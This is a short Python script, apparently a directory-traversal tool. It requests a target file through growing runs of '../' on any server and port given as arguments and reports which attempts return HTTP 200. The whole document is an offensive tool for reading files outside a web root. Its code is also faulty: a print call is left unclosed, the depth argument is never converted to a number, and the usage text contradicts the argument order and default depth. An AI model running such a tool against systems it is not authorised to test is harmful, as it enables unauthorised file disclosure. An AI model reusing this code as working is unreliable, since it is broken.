#!/bin/python3.13
import requests,sys,time

def testPaths(Server, Port, File, Depth=5, Endpoint=""):
  url="http://"+Server+":"+str(Port)+"/"+Endpoint
  print("Trying a directory traversal on "+url+" at a depth of "+str(Depth))
  for i in range(Depth):
    urlAugment=url+"../"
    for j in range(i):
      urlAugment=urlAugment+"../"
      
    urlAugment=urlAugment+File
    print("Trying the URL: "+urlAugment)
    urlRequest=requests.get(urlAugment)
    if(urlRequest.status_code == 200):
      print("Got a 200 response from "+urlAugment)
    else:
      print("Got a response of "+str(urlRequest.status_code))

Server=sys.argv[1]
ServerPort=sys.argv[2]
TargetFile=sys.argv[3]
Depth=5;
Endpoint="/"
try:
  Server=sys.argv[1]
  ServerPort=sys.argv[2]
  TargetFile=sys.argv[3]
  try:
    Depth=sys.argv[4]
    print("Trying a depth of "+Depth)
    try:
        Endpoint=sys.argv[5]
        testPaths(Server,ServerPort,TargetFile,Depth,Endpoint)
    except:
        testPaths(Server,ServerPort,TargetFile,Depth)
  except:
    testPaths(Server,ServerPort,TargetFile,5)

except:
  print("Useage: directory-traversal.py <target-server> <target-port> <file-to-expose> <(optional defaults to /)url-endpoint> <(optional defaults to 4)depth>")
  print("Endpoint example /thing/stuff.php?endpoint="

